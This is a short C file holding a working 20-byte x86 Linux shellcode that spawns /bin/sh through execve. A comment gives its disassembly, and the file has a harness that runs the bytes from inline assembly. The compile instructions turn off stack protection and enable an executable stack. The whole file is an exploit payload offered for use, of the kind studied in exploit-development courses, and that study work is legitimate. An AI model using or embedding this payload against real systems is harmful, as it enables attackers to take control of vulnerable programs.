#include <stdio.h>
#include <string.h>
/*
Disassembly of section .text:

00000000 <_start>:
   0: eb 05                 jmp    7 <starter>

00000002 <pwn>:
   2: 5b                    pop    ebx
   3: b0 0b                 mov    al,0xb
   5: cd 80                 int    0x80

00000007 <starter>:
   7: e8 f6 ff ff ff        call   2 <pwn>
   c: 2f                    das    
   d: 62 69 6e              bound  ebp,QWORD PTR [ecx+0x6e]
  10: 2f                    das    
  11: 2f                    das    
  12: 73 68                 jae    7c <starter+0x75>

Compilation: gcc -m32 exploit.c -o exploit -fno-stack-protector -z execstack
*/
unsigned char shellcode[] = \
"\xeb\x05\x5b\xb0\x0b\xcd\x80"
"\xe8\xf6\xff\xff\xff\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68";

void main(void) {

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	__asm__ (
		"xor %eax, %eax\n\t"
    "xor %ebx, %ebx\n\t"
    "xor %ecx, %ecx\n\t"
    "xor %edx, %edx\n\t"
    
		"call shellcode"
	);
}